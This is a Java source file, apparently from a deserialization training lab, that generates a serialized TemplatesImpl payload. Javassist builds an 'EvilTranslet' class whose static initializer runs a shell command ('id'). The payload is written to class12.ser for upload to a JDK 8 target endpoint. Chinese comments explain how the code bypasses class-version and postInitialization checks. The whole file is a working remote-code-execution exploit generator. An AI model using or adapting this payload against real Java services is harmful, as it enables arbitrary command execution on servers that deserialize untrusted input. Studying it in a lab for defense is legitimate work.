package class12;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtNewConstructor;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;

/**
 * 生成 class12 的 payload — TemplatesImpl (javassist 字节码)
 * 目标: 上传 TemplatesImpl 对象，服务端调用 newTransformer() 时加载恶意字节码
 * 靶场: /class12/upload
 *
 * 注意:
 * - 编译和运行需要 --add-exports/--add-opens（pom.xml 已配置）
 * - 字节码版本设为 52 (Java 8)，确保 JDK 8 靶场能加载
 * - transletVersion = 101 跳过 AbstractTranslet.postInitialization()
 */
public class GenPayload {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("EvilTranslet");
        ctClass.setSuperclass(pool.get(
                "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));

        // JDK 8 只能加载 class version 52 (Java 8)
        ctClass.getClassFile().setMajorVersion(52);
        ctClass.getClassFile().setMinorVersion(0);

        // static initializer → exec
        ctClass.makeClassInitializer().setBody(
                "try {" +
                "   Runtime.getRuntime().exec(\"id\");" +
                "} catch (Exception e) {" +
                "   e.printStackTrace();" +
                "}"
        );

        // 构造函数设置 transletVersion = 101 跳过 postInitialization()
        ctClass.addConstructor(
                CtNewConstructor.make(
                        "public EvilTranslet() { this.transletVersion = 101; }", ctClass));

        byte[] evilBytes = ctClass.toBytecode();

        TemplatesImpl templates = new TemplatesImpl();
        setField(templates, "_bytecodes", new byte[][]{evilBytes});
        setField(templates, "_tfactory", new TransformerFactoryImpl());
        setField(templates, "_transletIndex", 0);
        setField(templates, "_name", "EvilTranslet");

        ObjectOutputStream oos = new ObjectOutputStream(
                new FileOutputStream("class12.ser"));
        oos.writeObject(templates);
        oos.close();

        System.out.println("✅ 已生成: class12.ser");
        System.out.println("⚠️  需在 JDK 8 靶场测试，JDK 高版本无法反序列化");
    }

    private static void setField(Object obj, String name, Object val) throws Exception {
        Field f = obj.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(obj, val);
    }
}
